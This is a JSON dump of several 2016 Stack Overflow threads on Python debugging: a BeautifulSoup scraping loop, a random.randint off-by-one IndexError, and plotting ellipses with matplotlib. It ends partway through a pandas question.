[{"tags": ["python", "html", "parsing", "web-scraping", "beautifulsoup"], "answers": [{"comments": [{"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463012331, "post_id": 37175222, "comment_id": 61885166, "body": "thanks for the reply I&#39;m going to try that right now. and the class is videos, a copy and pasting error"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463012445, "post_id": 37175222, "comment_id": 61885192, "body": "@nothingness, try the edit first and see if that is what you actually want"}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463012756, "post_id": 37175222, "comment_id": 61885276, "body": "it does not work. And is this syntax correct in your code (&quot;section.video section.box&quot;) I&#39;ve never seen that in all the examples that I&#39;ve seen"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463012822, "post_id": 37175222, "comment_id": 61885292, "body": "It works using your sample exactly as you see it in my answer, <code>(&quot;section.video section.box&quot;)</code> is a css selector and perfectly valid, if you shared the link it might help"}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463013282, "post_id": 37175222, "comment_id": 61885395, "body": "I didn&#39;t make myself clear when I said it does not work. The text part of your two part answer works. but the looping through the video section does not work. I&#39;m going to go over my code again. thanks for the text part though. i really needed that part."}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463014358, "post_id": 37175222, "comment_id": 61885621, "body": "I could be wrong But I feel like since I changed from videos to box that the syntax I&#39;m looping over should be rearranged becausewhen I try what you suggest I get the error &#39;NoneType&#39; object has no attribute &#39;a&#39;"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463014467, "post_id": 37175222, "comment_id": 61885651, "body": "The only way that happens is if not all the tags have the children you are looking for, there is no silver bullet for that,  you can use explicit loop with a try/except to catch missing data."}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463014896, "post_id": 37175222, "comment_id": 61885740, "body": "I partly figured it out. It&#39;s the dot syntax that i questioned you about. i&#39;m using django so in my template soup.findAll(&#39;section&#39;, &#39;videos&#39;) this works but this soup.findAll(&#39;section.videos&#39;) returns all unformated code"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463014973, "post_id": 37175222, "comment_id": 61885758, "body": "Where am I using <code>soup.findAll(&#39;section.videos&#39;) </code>?"}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463015171, "post_id": 37175222, "comment_id": 61885806, "body": "soup.select(&quot;section.video section.box&quot;) this probably works fine in terminal but not in django it returns all unformatted codeI&#39;m thinking I may have to go one element up/backwards a level to scrape what I want"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463015267, "post_id": 37175222, "comment_id": 61885826, "body": "You should not be using that at all, that gets the sections, you then pull the data from each  sections in entries. I don&#39;t output anything directly from sections anywhere in my code"}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463015692, "post_id": 37175222, "comment_id": 61885901, "body": "but isn&#39;t that what you have in your code above? that&#39;s what you suggested? If i misunderstood could you shed some light? and give me some clarity. and So I&#39;m clear what should I not be using? this soup.select(&quot;section.video section.box&quot;)"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "edited": false, "score": 0, "creation_date": 1463015923, "post_id": 37175222, "comment_id": 61885937, "body": "Put the code in a function, <code>return entries</code> and it follows exactly the same logic pattern as your own code. Why would you output sections when you have used entries in your own code?"}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": false, "score": 0, "last_activity_date": 1463012416, "last_edit_date": 1463012416, "creation_date": 1463011835, "answer_id": 37175222, "question_id": 37175103, "link": "https://stackoverflow.com/questions/37175103/trying-to-loop-through-the-elements-using-beautifulsoup-but-i-keep-getting-navi/37175222#37175222", "title": "Trying to loop through the elements using Beautifulsoup But I keep getting &#39;NavigableString&#39; object has no attribute &#39;a&#39;", "body": "<p>Presuming all the sections actually contain elements this will work, you need to use <code>div.find(\"strong\")</code> and the class is <em>video</em> not <em>videos</em>:</p>\n\n<pre><code>divs = soup.find_all('section', 'video')\nentries = [{'text': div.find(\"strong\").a.text,\n            'link': div.a.get('href'),\n            'img': div.find('img').get('src')\n            } for div in divs]\n</code></pre>\n\n<p>If there are actually some tags like <code>&lt;section class=\"video\"&gt;&lt;/section&gt;</code> or not all the children are in each then you are going to have to take that into account and filter those. also <code>divs = soup.findAll('section', 'video')[0]</code> would get the first <em>video section</em> which is the same as using find, if you want them all then you need to use find_all and just iterate as you are.</p>\n\n<p>The data you want to get also seems to be on the <em>class=box</em> which is actually what you seem to want:</p>\n\n<pre><code>soup = BeautifulSoup(h,\"html5lib\")\n\n\nsections= soup.select(\"section.video section.box\")\nprint(sections)\n\nentries = [{'text': sec.find(\"strong\").a.text,\n            'link': sec.a.get('href'),\n            'img': sec.find('img').get('src')\n            } for sec in sections]\n\n\nfrom pprint import pprint as pp\n\npp(entries)\n</code></pre>\n\n<p>which gives you:</p>\n\n<pre><code>[{'img': u'http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg',\n  'link': u'/videos/video.php?v=wshhO9CO5349voIH6k6b',\n  'text': u'Stays Wildin: Blac Youngsta Showing Out With His Money!'},\n {'img': u'http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg',\n  'link': u'/videos/video.php?v=wshhO9CO5349voIH6k6b',\n  'text': u'Stays Wildin: Blac Youngsta Showing Out With His Money!'},\n {'img': u'http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg',\n  'link': u'/videos/video.php?v=wshhO9CO5349voIH6k6b',\n  'text': u'Stays Wildin: Blac Youngsta Showing Out With His Money!'}]\n</code></pre>\n\n<p>Obviously they are all the same using the sample but I presume in the real html they are all different, if you want to break the data up into each video section, first get the video sections then look for the <code>section.box</code> in each.</p>\n"}], "owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 492, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1463012416, "creation_date": 1463011005, "question_id": 37175103, "link": "https://stackoverflow.com/questions/37175103/trying-to-loop-through-the-elements-using-beautifulsoup-but-i-keep-getting-navi", "title": "Trying to loop through the elements using Beautifulsoup But I keep getting &#39;NavigableString&#39; object has no attribute &#39;a&#39;", "body": "<p>I keep getting the error </p>\n\n<pre><code>'NavigableString' object has no attribute 'a' \n</code></pre>\n\n<p>If I try it like this</p>\n\n<pre><code>        def get_vlad(url):\n            html = requests.get(url, headers=headers)\n            soup = BeautifulSoup(html.text, 'html5lib')\n            divs = soup.findAll('section', 'videos')[0]\n\n            entries = [{'text': div.strong.a.text,\n                        'link': div.a.get('href'),\n                        'img': div.find('img').get('src')\n                        } for div in divs]\n            return entries\n</code></pre>\n\n<p>I get this error</p>\n\n<pre><code> 'NavigableString' object has no attribute 'a' \n</code></pre>\n\n<p>but if I do it like this</p>\n\n<pre><code>        def get_vlad(url):\n            html = requests.get(url, headers=headers)\n            soup = BeautifulSoup(html.text, 'html5lib')\n            divs = soup.findAll('section', 'videos')\n\n            entries = [{'text': div.strong.a.text,\n                        'link': div.a.get('href'),\n                        'img': div.find('img').get('src')\n                        } for div in divs]\n            return entries\n</code></pre>\n\n<p>It works. But there are about 4 </p>\n\n<pre><code>&lt;div class=\"video\"&gt;\n</code></pre>\n\n<p>divs. So it takes the first video from each </p>\n\n<pre><code>&lt;div class=\"video\"&gt;\n</code></pre>\n\n<p>section. But I want to iterate through all the videos in the same div. So I did this</p>\n\n<pre><code>divs = soup.findAll('section', 'videos')[0]\n</code></pre>\n\n<p>but that give me the error so I tried this</p>\n\n<pre><code>divs = soup.find('section', 'videos')\n</code></pre>\n\n<p>Thinking that it would target the first video div and loop through all of those divs but that didn't work heres the html structure I'm scraping</p>\n\n<pre><code>        &lt;section class=\"video\"&gt;\n            &lt;section class=\"box\"&gt;\n                    &lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\" class=\"video-box\"&gt;\n                    &lt;img src=\"http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg\" width=\"222\" height=\"125\" alt=\"\"&gt;\n                    &lt;/a&gt;\n                    &lt;strong class=\"title\"&gt;&lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\"&gt;Stays Wildin: Blac Youngsta Showing Out With His Money!&lt;/a&gt;&lt;/strong&gt;\n                    &lt;div&gt;\n                    &lt;span class=\"views\"&gt;318,105&lt;/span&gt; \n                    &lt;span class=\"comments\"&gt;&lt;a href=\"http://www.example.org/videos/video.php?v=wshhO9CO5349voIH6k6b#disqus_thread\" data-disqus-identifier=\"94122\"&gt;3717&lt;/a&gt;&lt;/span&gt;\n                    &lt;/div&gt;\n            &lt;/section&gt;\n\n            &lt;section class=\"box\"&gt;\n                    &lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\" class=\"video-box\"&gt;\n                    &lt;img src=\"http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg\" width=\"222\" height=\"125\" alt=\"\"&gt;\n                    &lt;/a&gt;\n                    &lt;strong class=\"title\"&gt;&lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\"&gt;Stays Wildin: Blac Youngsta Showing Out With His Money!&lt;/a&gt;&lt;/strong&gt;\n                    &lt;div&gt;\n                    &lt;span class=\"views\"&gt;318,105&lt;/span&gt; \n                    &lt;span class=\"comments\"&gt;&lt;a href=\"http://www.example.org/videos/video.php?v=wshhO9CO5349voIH6k6b#disqus_thread\" data-disqus-identifier=\"94122\"&gt;3717&lt;/a&gt;&lt;/span&gt;\n                    &lt;/div&gt;\n            &lt;/section&gt;\n\n            &lt;section class=\"box\"&gt;\n                    &lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\" class=\"video-box\"&gt;\n                    &lt;img src=\"http://hw-static.example.org/u/pic/2016/05/2cuPh1LdFzJo.jpg\" width=\"222\" height=\"125\" alt=\"\"&gt;\n                    &lt;/a&gt;\n                    &lt;strong class=\"title\"&gt;&lt;a href=\"/videos/video.php?v=wshhO9CO5349voIH6k6b\"&gt;Stays Wildin: Blac Youngsta Showing Out With His Money!&lt;/a&gt;&lt;/strong&gt;\n                    &lt;div&gt;\n                    &lt;span class=\"views\"&gt;318,105&lt;/span&gt; \n                    &lt;span class=\"comments\"&gt;&lt;a href=\"http://www.example.org/videos/video.php?v=wshhO9CO5349voIH6k6b#disqus_thread\" data-disqus-identifier=\"94122\"&gt;3717&lt;/a&gt;&lt;/span&gt;\n                    &lt;/div&gt;\n            &lt;/section&gt;\n    &lt;/section&gt;\n\n    &lt;section class=\"video\"&gt;&lt;/section&gt;\n    &lt;section class=\"video\"&gt;&lt;/section&gt;\n</code></pre>\n\n<p>I want to iterate through the first</p>\n\n<pre><code>&lt;section class=\"video\"&gt;\n</code></pre>\n\n<p>and pull all the videos out from there. What's currently happening with my code is I'm pulling the first video from each video section which is not what I want to do. So why won't this</p>\n\n<pre><code>divs = soup.findAll('section', 'videos')[0]\n</code></pre>\n\n<p>or this</p>\n\n<pre><code>divs = soup.find('section', 'videos')\n</code></pre>\n\n<p>work?</p>\n"}, {"tags": ["python", "random", "indexing"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463014883, "post_id": 37175078, "comment_id": 61885737, "body": "randints upper bound is inclusive so you need to go -1 but list indexes also start at 0 so you may also want to just use ` random.randint(0,  HORSE_NUM -1 )` to allow the horse at index 0 to be picked. <a href=\"https://docs.python.org/2/library/random.html#random.randint\" rel=\"nofollow noreferrer\">docs.python.org/2/library/random.html#random.randint</a>"}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 5680423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7aa55731fde147553783f5f9852a602e?s=128&d=identicon&r=PG&f=1", "display_name": "Hampton Young", "link": "https://stackoverflow.com/users/5680423/hampton-young"}, "is_accepted": false, "score": 1, "last_activity_date": 1463011192, "creation_date": 1463011192, "answer_id": 37175127, "question_id": 37175078, "link": "https://stackoverflow.com/questions/37175078/python-error-code-indexerror-index-error-list-index-out-of-range/37175127#37175127", "title": "Python Error code: IndexError: index error list index out of range", "body": "<p>random.randint() is inclusive, so if you get a random integer that is equal to HORSE_NUM it will be out of bounds. try</p>\n\n<pre><code>rando = random.randint(0, HORSE_NUM - 1)\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6322914, "user_type": "registered", "profile_image": "https://graph.facebook.com/1735454063395746/picture?type=large", "display_name": "Alli", "link": "https://stackoverflow.com/users/6322914/alli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463015545, "creation_date": 1463010829, "last_edit_date": 1463015545, "question_id": 37175078, "link": "https://stackoverflow.com/questions/37175078/python-error-code-indexerror-index-error-list-index-out-of-range", "title": "Python Error code: IndexError: index error list index out of range", "body": "<p>I'm trying to write a function in Python that simulates a horse race. While there's no winner, it clears the screen, shows the list of horses (all have index starting at zero). Then, on the line I've marked, the code messes up. \nI get the index error list out of range. I'm trying to randomly pick a horse (randomly pick an index number) and add 1 to the value. But I can't seem to figure it out!!</p>\n\n<pre><code>while (no_winner):\n\n    os.system(\"cls\")\n\n    print(horses)\n\n    # randomly assign a horse to step forward\n    rando = random.randint(1, HORSE_NUM)\n    horses[rando] += 1  #######PROBLEM\n\n    # if the horse exceeds the finish line, he wins\n    if (steps &gt; FINISH_LINE):\n\n        winner = horses[index]\n        no_winner = False\n</code></pre>\n"}, {"tags": ["python", "file", "plot", "ellipse"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463010615, "post_id": 37175035, "comment_id": 61884737, "body": "Post the full traceback. In particular what line of your code caused the error?"}, {"owner": {"reputation": 409, "user_id": 6322840, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3e4fdfae5d9de76d19b0101d7bf979c0?s=128&d=identicon&r=PG&f=1", "display_name": "Vishnu", "link": "https://stackoverflow.com/users/6322840/vishnu"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463015659, "post_id": 37175035, "comment_id": 61885894, "body": "I have updated the post now."}], "answers": [{"comments": [{"owner": {"reputation": 409, "user_id": 6322840, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3e4fdfae5d9de76d19b0101d7bf979c0?s=128&d=identicon&r=PG&f=1", "display_name": "Vishnu", "link": "https://stackoverflow.com/users/6322840/vishnu"}, "edited": false, "score": 0, "creation_date": 1463066280, "post_id": 37175996, "comment_id": 61914788, "body": "This shows an empty figure with no plots. The scale doesn&#39;t change. How do I auto adjust the scale of x and y axis based on the data?"}, {"owner": {"reputation": 350, "user_id": 1913361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5eef085df2567c9bdeec1c30ec083d2b?s=128&d=identicon&r=PG&f=1", "display_name": "masat", "link": "https://stackoverflow.com/users/1913361/masat"}, "reply_to_user": {"reputation": 409, "user_id": 6322840, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3e4fdfae5d9de76d19b0101d7bf979c0?s=128&d=identicon&r=PG&f=1", "display_name": "Vishnu", "link": "https://stackoverflow.com/users/6322840/vishnu"}, "edited": false, "score": 0, "creation_date": 1463067077, "post_id": 37175996, "comment_id": 61915333, "body": "you can adjust x and y limits with plt.xlim and plt.ylim. I edited my answer accordingly."}], "tags": [], "owner": {"reputation": 350, "user_id": 1913361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5eef085df2567c9bdeec1c30ec083d2b?s=128&d=identicon&r=PG&f=1", "display_name": "masat", "link": "https://stackoverflow.com/users/1913361/masat"}, "is_accepted": false, "score": 1, "last_activity_date": 1463066926, "last_edit_date": 1463066926, "creation_date": 1463018246, "answer_id": 37175996, "question_id": 37175035, "link": "https://stackoverflow.com/questions/37175035/plotting-multiple-ellipses-on-same-figure-with-data-from-text-file/37175996#37175996", "title": "Plotting multiple ellipses on same figure with data from text file", "body": "<p>Seems like you need to use a PatchCollection, see <a href=\"http://matplotlib.org/examples/api/patch_collection.html\" rel=\"nofollow\">this example</a>. Try something like this</p>\n\n<pre><code>plt.figure()\nax = plt.gca()\nellipses = []\nplt.xlim([0,100])\nplt.ylim([0,100])\nfor ra, dec, w ... zip(...):\n    ellipse = Ellipse(xy=(ra, dec), width=w, height=h, angle=angle)\n    ellipses.append(ellipse)\np = PatchCollection(ellipses)\nax.add_collection(p)\nplt.show()\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1859, "user_id": 6195051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c29d0f5e025b59a5e36c70fdd4333530?s=128&d=identicon&r=PG&f=1", "display_name": "Neapolitan", "link": "https://stackoverflow.com/users/6195051/neapolitan"}, "is_accepted": false, "score": 1, "last_activity_date": 1463020549, "creation_date": 1463020549, "answer_id": 37176311, "question_id": 37175035, "link": "https://stackoverflow.com/questions/37175035/plotting-multiple-ellipses-on-same-figure-with-data-from-text-file/37176311#37176311", "title": "Plotting multiple ellipses on same figure with data from text file", "body": "<p>I'm guessing the problem is that you have one too many levels of nesting on ra_degrees, etc.  </p>\n\n<p>That is, if you print table['ra'] you will probably find that it is already an array.  When you enclose it in square brackets, [table['ra']] will then be a list of length one. The zip function takes one item from each sequence at a time, so in your for loop, ra will be assigned table['ra'] the first and only time through the loop.</p>\n\n<p>Another issue is that you are opening the file twice.  You are passing the filename to asciitable.read, and are never actually using fw.</p>\n\n<p>The code below might work better.  </p>\n\n<pre><code>import numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotlib.patches import Ellipse\nimport astropy.io.ascii as asciitable\n\npath=/users/vishnu/Desktop/\ntable = asciitable.read(path + \"data_plot.txt\")\n\nra_degrees = table['ra']\ndec_degrees = table['dec']\nmajor_axis_deg = table['major_axis']\nminor_axis_deg = table['minor_axis']\nposition_angle_deg = table['position_angle']\n\nfor ra, dec, w, h, angle in zip(ra_degrees, dec_degrees,\n        major_axis_deg, minor_axis_deg, position_angle_deg):\n    ellipse = Ellipse(xy=(ra, dec), width=w, height=h, angle=angle)\n    ax.add_patch(ellipse)\nplt.axis('scaled')\nplt.show()\n</code></pre>\n\n<p>If asciitable works with an open file rather than a file name, then use the following instead:</p>\n\n<pre><code>with open(path + \"data_plot.txt\") as fw:\n    table = asciitable.read(fw)\n</code></pre>\n\n<p>This makes sure that the file is closed even if there are errors in asciitable.read that cause it to raise an exception.  Given the error above, though, it looks like you have already read the data.</p>\n"}], "owner": {"reputation": 409, "user_id": 6322840, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3e4fdfae5d9de76d19b0101d7bf979c0?s=128&d=identicon&r=PG&f=1", "display_name": "Vishnu", "link": "https://stackoverflow.com/users/6322840/vishnu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 908, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1463067403, "creation_date": 1463010513, "last_edit_date": 1592644375, "question_id": 37175035, "link": "https://stackoverflow.com/questions/37175035/plotting-multiple-ellipses-on-same-figure-with-data-from-text-file", "title": "Plotting multiple ellipses on same figure with data from text file", "body": "<p>I am new to python, so I am sorry if this is too trivial.</p>\n<p>This is an example of the first two lines of the text file.</p>\n<blockquote>\n<p>ra dec major_axis minor_axis position_angle</p>\n<p>149.20562 2.29594 0.00418 0.00310 83.40</p>\n</blockquote>\n<p>Each line of the file has 5 parameters which is needed to plot one ellipse. The first two columns are for the center. The next 3 columns are major axis, minor axis and position angle respectively. This file is part of a huge catalog which has many lines. I want to plot all those ellipses in one figure.</p>\n<p>Here is what I tried.</p>\n<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\nimport astropy.io.ascii as asciitable\nfrom matplotlib.patches import Ellipse\n\n\npath=/users/vishnu/Desktop/\nfw=open(path + 'data_plot.txt', 'r')\ntable = asciitable.read(path+ &quot;data_plot.txt&quot;)\nra_degrees=[table['ra']]\ndec_degrees=[table['dec']]\nmajor_axis_deg=[table['major_axis']]\nminor_axis_deg=[table['minor_axis']]\nposition_angle_deg=[table['position_angle']]\n\n\n\nfor ra, dec, w, h, angle in zip(ra_degrees,\ndec_degrees,major_axis_deg, minor_axis_deg, position_angle_deg):\n    ellipse = Ellipse(xy=(ra, dec), width=w, height=h, angle=angle)\n    ax.add_patch(ellipse)\nplt.axis('scaled')\nplt.show()\nfw.close()\n</code></pre>\n<p>This is the error log.</p>\n<pre><code>  runfile('/users/vishnu/.spyder2-py3/radio_sources.py', wdir='/users/vishnu/.spyder2-py3')\nTraceback (most recent call last):\n\n  File &quot;&lt;ipython-input-299-a0011c0326f5&gt;&quot;, line 1, in &lt;module&gt;\n    runfile('/users/vishnu/.spyder2-py3/radio_sources.py', wdir='/users/vishnu/.spyder2-py3')\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/spyderlib/widgets/externalshell/sitecustomize.py&quot;, line 699, in runfile\n    execfile(filename, namespace)\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/spyderlib/widgets/externalshell/sitecustomize.py&quot;, line 88, in execfile\n    exec(compile(open(filename, 'rb').read(), filename, 'exec'), namespace)\n\n  File &quot;/users/vishnu/.spyder2-py3/radio_sources.py&quot;, line 63, in &lt;module&gt;\n    ax.add_patch(ellipse)\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/matplotlib/axes/_base.py&quot;, line 1783, in add_patch\n    self._update_patch_limits(p)\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/matplotlib/axes/_base.py&quot;, line 1803, in _update_patch_limits\n    xys = patch.get_patch_transform().transform(vertices)\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/matplotlib/patches.py&quot;, line 1409, in get_patch_transform\n    self._recompute_transform()\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/matplotlib/patches.py&quot;, line 1398, in _recompute_transform\n    .scale(width * 0.5, height * 0.5) \\\n\n  File &quot;/users/vishnu/anaconda3/lib/python3.5/site-packages/matplotlib/transforms.py&quot;, line 1965, in scale\n    np.float_)\n\nValueError: setting an array element with a sequence.\n</code></pre>\n<p>Please also let me know if there is a smarter way to do this without the need to create arrays.</p>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 238133, "user_id": 2336654, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/Mqqfo.png?s=128&g=1", "display_name": "piRSquared", "link": "https://stackoverflow.com/users/2336654/pirsquared"}, "edited": false, "score": 0, "creation_date": 1463012791, "post_id": 37175022, "comment_id": 61885284, "body": "I don&#39;t know of such a thing.  Assuming I&#39;m right, are you interested in a work around?  Or just if people are interested in asking for a feature?"}, {"owner": {"reputation": 1003, "user_id": 1483516, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/97f19b874f98797ff0a07478d351e29a?s=128&d=identicon&r=PG", "display_name": "seewalker", "link": "https://stackoverflow.com/users/1483516/seewalker"}, "reply_to_user": {"reputation": 238133, "user_id": 2336654, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/Mqqfo.png?s=128&g=1", "display_name": "piRSquared", "link": "https://stackoverflow.com/users/2336654/pirsquared"}, "edited": false, "score": 0, "creation_date": 1463020777, "post_id": 37175022, "comment_id": 61887199, "body": "I&#39;m just starting a conversation, I&#39;m interesting in any number of relevant responses."}], "answers": [{"tags": [], "owner": {"reputation": 86481, "user_id": 2411802, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/RA92x.jpg?s=128&g=1", "display_name": 